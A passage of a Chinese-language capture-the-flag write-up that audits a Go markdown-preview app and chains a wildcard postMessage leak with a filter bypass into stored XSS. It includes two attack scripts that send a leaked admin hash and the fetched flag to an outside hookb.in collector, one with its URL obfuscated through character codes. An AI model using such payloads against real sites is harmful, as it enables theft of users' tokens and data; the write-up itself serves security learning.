+		<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Error decoding JSON. err = %s&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Fprintf</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="s">&#34;Error decoding JSON.&#34;</span><span class="p">)</span>
+
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="kd">var</span> <span class="nx">cookie</span><span class="p">,</span> <span class="nx">isset</span> <span class="p">=</span> <span class="nx">r</span><span class="p">.</span><span class="nf">Cookie</span><span class="p">(</span><span class="s">&#34;Token&#34;</span><span class="p">)</span>
+
+		<span class="nx">hash</span><span class="p">,</span> <span class="nx">token</span> <span class="o">:=</span> <span class="nf">createToken</span><span class="p">()</span> <span class="c1">// 生成Token并使用Cookies存储
+</span><span class="c1"></span>
+		<span class="nx">sanitized_data</span> <span class="o">:=</span> <span class="nx">markdown</span><span class="p">.</span><span class="nf">ToHTML</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">unsanitized</span><span class="p">.</span><span class="nx">Raw</span><span class="p">)),</span> <span class="kc">nil</span><span class="p">,</span> <span class="kc">nil</span><span class="p">)</span> <span class="c1">// 过滤RawData
+</span><span class="c1"></span>        <span class="c1">// 这里应该是远程生成adminBot身份时用的，因为isset=nil时cookie.Value的值也不应该存在
+</span><span class="c1"></span>		<span class="k">if</span> <span class="nx">isset</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
+			<span class="k">if</span> <span class="nx">cookie</span><span class="p">.</span><span class="nx">Value</span> <span class="o">==</span> <span class="nx">CONFIG</span><span class="p">.</span><span class="nx">admin_token</span> <span class="p">{</span>
+				<span class="nx">hash</span> <span class="p">=</span> <span class="nx">CONFIG</span><span class="p">.</span><span class="nx">admin_hash</span>
+				<span class="nx">token</span> <span class="p">=</span> <span class="nx">CONFIG</span><span class="p">.</span><span class="nx">admin_token</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+
+		<span class="nx">cookie</span> <span class="p">=</span> <span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Cookie</span><span class="p">{</span><span class="nx">Name</span><span class="p">:</span> <span class="s">&#34;Token&#34;</span><span class="p">,</span> <span class="nx">Value</span><span class="p">:</span> <span class="nx">token</span><span class="p">,</span> <span class="nx">HttpOnly</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">Path</span><span class="p">:</span> <span class="s">&#34;/api&#34;</span><span class="p">}</span> <span class="c1">// 设置Cookies
+</span><span class="c1"></span>		<span class="nx">result</span> <span class="o">:=</span> <span class="nx">Sanitized</span><span class="p">{</span><span class="nx">Sanitized</span><span class="p">:</span> <span class="nb">string</span><span class="p">(</span><span class="nx">sanitized_data</span><span class="p">),</span> <span class="nx">Raw</span><span class="p">:</span> <span class="nx">unsanitized</span><span class="p">.</span><span class="nx">Raw</span><span class="p">,</span> <span class="nx">Hash</span><span class="p">:</span> <span class="nx">hash</span><span class="p">}</span> <span class="c1">// 返回的JSON
+</span><span class="c1"></span>		<span class="nx">http</span><span class="p">.</span><span class="nf">SetCookie</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">cookie</span><span class="p">)</span> 
+        <span class="nx">json</span><span class="p">.</span><span class="nf">NewEncoder</span><span class="p">(</span><span class="nx">w</span><span class="p">).</span><span class="nf">Encode</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="c1">// {Sanitized, Raw, Hash} 这里向前端返回了Hash用于后续的Save操作
+</span><span class="c1"></span>	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>​	我们能够在前端Console中查看后端返回的Data，使用<code>data</code>，</p>
+<figure><a class="lightgallery" href="https://image.p1nant0m.com/image-20210927160743166.png" title="https://image.p1nant0m.com/image-20210927160743166.png" data-thumbnail="https://image.p1nant0m.com/image-20210927160743166.png" data-sub-html="<h2>后端返回的 Data</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://image.p1nant0m.com/image-20210927160743166.png"
+            data-srcset="https://image.p1nant0m.com/image-20210927160743166.png, https://image.p1nant0m.com/image-20210927160743166.png 1.5x, https://image.p1nant0m.com/image-20210927160743166.png 2x"
+            data-sizes="auto"
+            alt="https://image.p1nant0m.com/image-20210927160743166.png" />
+    </a><figcaption class="image-caption">后端返回的 Data</figcaption>
+    </figure>
+<p>​	注意到这里的Cookie被设置了为<code>HttpOnly</code>，这导致我们无法使用脚本去获取Cookie的值，</p>
+<blockquote>
+<p>​	JavaScript <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie" target="_blank" rel="noopener noreffer "><code>Document.cookie</code></a> API 无法访问带有 <code>HttpOnly</code> 属性的cookie；此类 Cookie 仅作用于服务器。例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 <code>HttpOnly</code> 属性。此预防措施有助于缓解<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks" target="_blank" rel="noopener noreffer ">跨站点脚本（XSS） (en-US)</a>攻击。</p>
+</blockquote>
+<p>​	从后端返回的Sanitized_Data被直接写入到HTMLBODY中，通过<code>document.body.innerHTML</code>设置，这样便可以确保被浏览器渲染的代码是安全的。</p>
+<p>​	在<code>preview.js</code>中有一段对破题具有十分重要提示的代码</p>
+<p>​																				<code>window.parent.postMessage(response, &quot;*&quot;); </code></p>
+<p>​	这里的targetOrigin被设置为了<code>*</code>，这意味着任何载入该<code>frame</code>的页面都能够收到此<code>response</code>（response: {Sanitized, Raw, <strong>Hash</strong>}）</p>
+<blockquote>
+<p>​	我们能够构造一段恶意的Script，在HTML中载入/demo的frame，接着让adminBot访问该页面，我们就能够获取admin身份下，response中的Hash，这段Hash的作用在之后的分析中还会提及。</p>
+</blockquote>
+<p>恶意Script代码的构造，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="kd">function</span> <span class="nx">exploit</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;iframe&#34;</span><span class="p">).</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s2">&#34;Hello&#34;</span><span class="p">,</span><span class="s2">&#34;*&#34;</span><span class="p">)</span>
+    <span class="p">}</span>
+
+    <span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;message&#34;</span><span class="p">,(</span><span class="nx">event</span><span class="p">)=&gt;{</span>
+        <span class="kd">var</span> <span class="nx">img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span>
+        <span class="nx">img</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">&#34;https://hookb.in/NOP1yLbpQwSe8mNN8mR2?hash=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">Hash</span><span class="p">);</span>
+    <span class="p">},</span><span class="kc">false</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://localhost:8080/demo&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;iframe&#34;</span> <span class="na">onload</span><span class="o">=</span><span class="s">&#34;exploit()&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>​	当admin用户访问该网页时，其HASH将会被我们获取，这样我们便实现了一次CORS</p>
+<p>​	在这段代码<code>filterHandler</code>中还调用了<code>createToken()</code>，我们来看看token生成的过程，</p>
+<p><code>server.go</code>  	{63-69}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">createToken</span><span class="p">()</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">token</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">uuid</span><span class="p">.</span><span class="nf">NewV4</span><span class="p">()</span> <span class="c1">// 随机生成一个UUID （字符串）
+</span><span class="c1"></span>	<span class="nx">h</span> <span class="o">:=</span> <span class="nx">sha256</span><span class="p">.</span><span class="nf">New</span><span class="p">()</span>
+	<span class="nx">h</span><span class="p">.</span><span class="nf">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">token</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span> <span class="o">+</span> <span class="nx">CONFIG</span><span class="p">.</span><span class="nx">secret</span><span class="p">))</span> <span class="c1">// CONFIG.secret = os.Getenv(&#34;SECRET&#34;) = &#34;REDACTED&#34;
+</span><span class="c1"></span>	<span class="nx">sha256_hash</span> <span class="o">:=</span> <span class="nx">hex</span><span class="p">.</span><span class="nf">EncodeToString</span><span class="p">(</span><span class="nx">h</span><span class="p">.</span><span class="nf">Sum</span><span class="p">(</span><span class="kc">nil</span><span class="p">))</span>
+	<span class="k">return</span> <span class="nb">string</span><span class="p">(</span><span class="nx">sha256_hash</span><span class="p">),</span> <span class="nx">token</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>​	uuid是Universally Unique Identifier的缩写，即通用唯一识别码。</p>
+<p>​	uuid的目的是让分布式系统中的所有元素，都能有唯一的辨识资讯，而不需要透过中央控制端来做辨识资讯的指定。如此一来，每个人都可以建立不与其它人冲突的 uuid。A universally unique identifier (UUID) is a 128-bit number used to identify information in computer systems.</p>
+</blockquote>
+<p>​	<code>h.Write([]byte(token.String() + CONFIG.secret))</code> 告诉了我们$HASH$函数的输入</p>
+<p>​	至此我们已分析完毕preview点击时的逻辑，并且给出了一段能够实现CORS获取adminHash的恶意代码</p>
+<p>​	当我们单击Save时，将会执行下列代码，</p>
+<p><code>app.js</code> {18-43}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="nx">save</span><span class="p">.</span><span class="nx">onclick</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nx">token</span> <span class="o">==</span> <span class="kc">undefined</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;Preview before saving!&#34;</span><span class="p">)</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;/api/create&#34;</span><span class="p">,</span> <span class="p">{</span>
+			<span class="nx">method</span><span class="o">:</span> <span class="s2">&#34;POST&#34;</span><span class="p">,</span>
+			<span class="nx">credentials</span><span class="o">:</span> <span class="s2">&#34;include&#34;</span><span class="p">,</span>
+			<span class="nx">body</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+				<span class="nx">Hash</span><span class="o">:</span> <span class="nx">token</span><span class="p">,</span>
+				<span class="nx">Raw</span><span class="o">:</span> <span class="nx">textarea</span><span class="p">.</span><span class="nx">value</span>
+			<span class="p">})</span>
+		<span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">resp</span> <span class="p">=&gt;</span> <span class="nx">resp</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
+		<span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span> <span class="p">=&gt;</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">[</span><span class="s2">&#34;Status&#34;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&#34;success&#34;</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;Could not save markdown.&#34;</span><span class="p">)</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;Saved post to : &#34;</span> <span class="o">+</span> <span class="nx">response</span><span class="p">[</span><span class="s2">&#34;Bucket&#34;</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="nx">response</span><span class="p">[</span><span class="s2">&#34;PostId&#34;</span><span class="p">])</span>
+                <span class="nx">frame</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="sb">`http://</span><span class="si">${</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">host</span><span class="si">}</span><span class="sb">/</span><span class="si">${</span><span class="nx">response</span><span class="p">[</span><span class="s1">&#39;Bucket&#39;</span><span class="p">]</span><span class="si">}</span><span class="sb">/</span><span class="si">${</span><span class="nx">response</span><span class="p">[</span><span class="s2">&#34;PostId&#34;</span><span class="p">]</span><span class="si">}</span><span class="sb">`</span>
+            <span class="p">}</span>
+			<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span>
+			<span class="nx">token</span> <span class="o">=</span> <span class="kc">undefined</span>
+		<span class="p">});</span> 
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="kc">false</span><span class="p">;</span> 
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>​	前端向后端Go服务器的<code>/api/create</code>接口提交了一个POST请求，其中的参数为当前用户执行Preview操作时获取的Hash和用户输入的Raw_data（未经过滤），该ElementID由<code>input-area</code>指示。下面我们将审计<code>server.go createHandler()</code>代码，</p>
+<p><code>server.go createHandler()</code> {173-215}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">createHandler</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">reqBody</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadAll</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">Body</span><span class="p">)</span>
+	<span class="nx">w</span><span class="p">.</span><span class="nf">Header</span><span class="p">().</span><span class="nf">Set</span><span class="p">(</span><span class="s">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s">&#34;application/json&#34;</span><span class="p">)</span>
+
+	<span class="kd">type</span> <span class="nx">Response</span> <span class="kd">struct</span> <span class="p">{</span>
+		<span class="nx">Status</span> <span class="kt">string</span>
+		<span class="nx">PostId</span> <span class="kt">int</span>
+		<span class="nx">Bucket</span> <span class="kt">string</span>
+	<span class="p">}</span>
+	<span class="kd">var</span> <span class="nx">createpost</span> <span class="nx">CreatePost</span>
+
+	<span class="k">if</span> <span class="nx">json</span><span class="p">.</span><span class="nf">Unmarshal</span><span class="p">(</span><span class="nx">reqBody</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">createpost</span><span class="p">)</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+		<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;There was an error decoding json. \n&#34;</span><span class="p">)</span>
+		<span class="nx">json</span><span class="p">.</span><span class="nf">NewEncoder</span><span class="p">(</span><span class="nx">w</span><span class="p">).</span><span class="nf">Encode</span><span class="p">(</span><span class="nx">Response</span><span class="p">{</span><span class="nx">Status</span><span class="p">:</span> <span class="s">&#34;Save Error&#34;</span><span class="p">})</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="kd">var</span> <span class="nx">cookie</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">r</span><span class="p">.</span><span class="nf">Cookie</span><span class="p">(</span><span class="s">&#34;Token&#34;</span><span class="p">)</span>
+
+		<span class="k">if</span> <span class="nx">err</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
+			<span class="kd">var</span> <span class="nx">token</span> <span class="p">=</span> <span class="nx">cookie</span><span class="p">.</span><span class="nx">Value</span>
+			<span class="k">if</span> <span class="nf">verifyToken</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">createpost</span><span class="p">.</span><span class="nx">Hash</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nx">createpost</span><span class="p">.</span><span class="nx">Hash</span> <span class="o">==</span> <span class="nx">CONFIG</span><span class="p">.</span><span class="nx">admin_hash</span><span class="p">)</span> <span class="p">{</span>
+				<span class="nx">bucket</span> <span class="o">:=</span> <span class="nx">CONFIG</span><span class="p">.</span><span class="nx">admin_bucket</span>
+				<span class="nx">data</span> <span class="o">:=</span> <span class="nx">createpost</span><span class="p">.</span><span class="nx">Raw</span>
+
+				<span class="k">if</span> <span class="nx">createpost</span><span class="p">.</span><span class="nx">Hash</span> <span class="o">!=</span> <span class="nx">CONFIG</span><span class="p">.</span><span class="nx">admin_hash</span> <span class="p">{</span>
+					<span class="nx">id</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">uuid</span><span class="p">.</span><span class="nf">NewV4</span><span class="p">()</span>
+					<span class="nx">bucket</span> <span class="p">=</span> <span class="nx">id</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span>
+					<span class="nx">data</span> <span class="p">=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">markdown</span><span class="p">.</span><span class="nf">ToHTML</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">data</span><span class="p">)),</span> <span class="kc">nil</span><span class="p">,</span> <span class="kc">nil</span><span class="p">))</span>
+				<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+					<span class="nx">data</span> <span class="p">=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">markdown</span><span class="p">.</span><span class="nf">ToHTML</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">data</span><span class="p">),</span> <span class="kc">nil</span><span class="p">,</span> <span class="kc">nil</span><span class="p">))</span> <span class="c1">// 使用adminHash提交的data不会被过滤！
+</span><span class="c1"></span>				<span class="p">}</span>
+
+				<span class="nx">postid</span> <span class="o">:=</span> <span class="nf">save_post</span><span class="p">(</span><span class="nx">bucket</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span>
+				<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Saved post to&#34;</span><span class="p">,</span> <span class="nx">postid</span><span class="p">)</span>
+				<span class="nx">json</span><span class="p">.</span><span class="nf">NewEncoder</span><span class="p">(</span><span class="nx">w</span><span class="p">).</span><span class="nf">Encode</span><span class="p">(</span><span class="nx">Response</span><span class="p">{</span><span class="nx">Status</span><span class="p">:</span> <span class="s">&#34;success&#34;</span><span class="p">,</span> <span class="nx">Bucket</span><span class="p">:</span> <span class="nx">bucket</span><span class="p">,</span> <span class="nx">PostId</span><span class="p">:</span> <span class="nx">postid</span><span class="p">})</span>
+			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+				<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Verification failed for &#34;</span><span class="p">,</span> <span class="nx">createpost</span><span class="p">.</span><span class="nx">Hash</span><span class="p">,</span> <span class="nx">token</span><span class="p">)</span>
+				<span class="nx">json</span><span class="p">.</span><span class="nf">NewEncoder</span><span class="p">(</span><span class="nx">w</span><span class="p">).</span><span class="nf">Encode</span><span class="p">(</span><span class="nx">Response</span><span class="p">{</span><span class="nx">Status</span><span class="p">:</span> <span class="s">&#34;Token not verified&#34;</span><span class="p">})</span>
+			<span class="p">}</span>
+		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+			<span class="nx">json</span><span class="p">.</span><span class="nf">NewEncoder</span><span class="p">(</span><span class="nx">w</span><span class="p">).</span><span class="nf">Encode</span><span class="p">(</span><span class="nx">Response</span><span class="p">{</span><span class="nx">Status</span><span class="p">:</span> <span class="s">&#34;Invalid body.&#34;</span><span class="p">})</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>​	在前面我们已经获取了admin的Hash，现在我们只要需要简单的在Post数据项中加入adminHash便可绕过filter，实现Stored XSS。我们的目标时获取服务器中存储的FLAG，通过代码审计我们可以知道当我们Cookies中<code>Token = admin_token</code>时便可以获取FLAG，且FLAG就为<code>admin_token</code>，由于我们并不知道<code>admin_token</code>的值所以并不能通过更改本地的Cookies来实现对<code>/api/flag</code>接口的访问，但是我们可以让admin访问我们上传的恶意代码后将其token发送回我们控制的Web服务器中，下面是我们恶意脚本的构造，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="nx">fetch</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">47</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">103</span><span class="p">))</span>
+    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span>
+        <span class="nx">img</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">104</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> 
+        <span class="mi">111</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">74</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> 
+        <span class="mi">72</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">61</span><span class="p">)</span> <span class="c1">// 攻击者控制的Web服务器 e.g. http://localhost:8888?flag=
+</span><span class="c1"></span>        <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">());</span>
+    <span class="p">})</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>server.go flag</code> {217-228}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">flag</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kd">var</span> <span class="nx">cookie</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">r</span><span class="p">.</span><span class="nf">Cookie</span><span class="p">(</span><span class="s">&#34;Token&#34;</span><span class="p">)</span>
+	<span class="nx">res</span> <span class="o">:=</span> <span class="nx">Preview</span><span class="p">{</span><span class="nx">Error</span><span class="p">:</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="nx">Data</span><span class="p">:</span> <span class="s">&#34;&#39;&#34;</span><span class="p">}</span>
+	<span class="k">if</span> <span class="nx">err</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="nx">cookie</span><span class="p">.</span><span class="nx">Value</span> <span class="o">==</span> <span class="nx">CONFIG</span><span class="p">.</span><span class="nx">admin_token</span> <span class="p">{</span>
